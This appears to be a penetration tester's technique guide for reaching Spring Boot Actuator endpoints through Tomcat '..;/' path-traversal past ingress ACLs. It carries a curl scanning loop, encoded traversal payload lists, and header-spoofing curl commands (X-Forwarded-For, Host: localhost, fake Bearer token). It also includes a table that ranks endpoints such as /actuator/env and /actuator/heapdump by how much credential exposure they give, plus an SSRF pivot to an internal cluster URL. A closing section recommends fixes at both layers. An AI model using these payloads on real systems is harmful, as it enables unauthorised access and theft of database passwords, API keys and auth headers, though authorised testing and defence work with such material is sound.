# Path Traversal + Actuator Bypass Techniques

Techniques for bypassing path-based ACLs to reach Spring Boot Actuator endpoints, discovered during real engagements against GKE/Istio infrastructure.

## The ..;/ Technique (Tomcat Path Parameter)

Tomcat treats `;` as a path parameter delimiter. The path `/onboarding/..;/actuator` is processed as:
1. Ingress/proxy sees `/onboarding/..;/actuator` → matches `/onboarding/*` rule → allows
2. Tomcat normalizes to `/actuator` (strips `;` and resolves `..`)
3. Request reaches actuator endpoint

### Testing Pattern

```bash
TARGET="https://target.com"

# Find a base path that's allowed through the ingress
# (any path that returns 200/302 instead of 403/404)
BASE_PATHS=("/onboarding" "/master/v1" "/api" "/public" "/health")

for base in "${BASE_PATHS[@]}"; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET}${base}/..;/actuator/health" -L --max-time 10)
  echo "${base}/..;/actuator/health → HTTP $code"
done
```

### Actuator Endpoints to Target (ordered by value)

| Endpoint | Value | Why |
|----------|-------|-----|
| /actuator/env | CRITICAL | Environment variables — DB passwords, API keys, JWT secrets |
| /actuator/heapdump | CRITICAL | JVM heap — extract any in-memory secret |
| /actuator/configprops | HIGH | All Spring configuration including credentials |
| /actuator/mappings | HIGH | All URL mappings — complete API surface |
| /actuator/gateway/routes | HIGH | Spring Cloud Gateway routes — internal service URLs |
| /actuator/beans | MEDIUM | All Spring beans — reveals architecture |
| /actuator/health | LOW | Health check — confirms DB connectivity, disk space |
| /actuator/info | LOW | Build info, git commit |
| /actuator/loggers | MEDIUM | Can POST to change log levels (enable DEBUG) |
| /actuator/httptrace | HIGH | Recent HTTP requests including auth headers |

### Encoding Variations

When the basic `..;/` is blocked, try:

```bash
# URL-encoded semicolon
/base/%2e%2e;/actuator/env
/base/..%3b/actuator/env

# Double URL encoding
/base/%252e%252e%253b/actuator/env

# Mixed case (if WAF is case-sensitive)
/base/..;/Actuator/env
/base/..;/ACTUATOR/env

# Multiple traversals
/base/..;/..;/actuator/env
/base/foo/..;/bar/..;/actuator/env

# With trailing slash
/base/..;/actuator/env/

# With extension
/base/..;/actuator/env.json
```

## Defense-in-Depth Assessment

When path traversal reaches actuator but gets 403:

```
[Internet] → [Ingress/Proxy] → [Tomcat/App]
                  ↓                    ↓
            Path ACL (bypassed)   Secondary ACL (blocking)
```

### Identifying the Secondary ACL

| Response | Likely ACL |
|----------|-----------|
| 403 with HTML page (custom error) | Application-level Spring Security |
| 403 with JSON `{"error":"Forbidden"}` | Spring Boot default |
| 403 with GCP IAP page | Google Identity-Aware Proxy |
| 403 with Cloudflare page | Cloudflare WAF rule |
| 401 with `WWW-Authenticate` | Requires auth token |

### Bypass Attempts for Secondary ACL

```bash
# IP spoofing headers (if backend trusts proxy headers)
curl "${TARGET}/base/..;/actuator/env" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -H "X-Real-IP: 10.0.0.1"

# Internal host header
curl "${TARGET}/base/..;/actuator/env" \
  -H "Host: localhost"

# Accept header manipulation
curl "${TARGET}/base/..;/actuator/env" \
  -H "Accept: application/json"

# With fake auth (sometimes actuator checks for ANY token, not valid one)
curl "${TARGET}/base/..;/actuator/env" \
  -H "Authorization: Bearer fake"
```

## Reporting

Even if actuator access is ultimately blocked, document:

1. **Path traversal works** — the ingress ACL is bypassable (FINDING)
2. **Actuator exists** — confirmed by 403 (not 404)
3. **Single point of failure** — if the secondary ACL is misconfigured or removed, full credential exposure
4. **Recommendation** — fix at BOTH layers:
   - Ingress: normalize paths before ACL evaluation
   - App: Spring Security should block actuator regardless of path

## Real-World Example

```
# Confirmed bypass (ingress allows, app blocks)
/onboarding/..;/actuator → 302 → /actuator → 403

# What this means:
# - Ingress rule: allow /onboarding/* → ✓ (matched)
# - Tomcat resolves: /onboarding/..;/actuator → /actuator
# - Spring Security: deny /actuator/** → 403
# - Defense-in-depth is working, but first layer is broken
```

## Combined with SSRF

If you find SSRF on an internal service, use it to hit actuator from inside:
```
# Internal request bypasses external ACLs
SSRF → http://prod-ms-master.prod.svc.cluster.local:8080/actuator/env
```
Internal actuator endpoints often have NO auth (security-by-network-boundary).
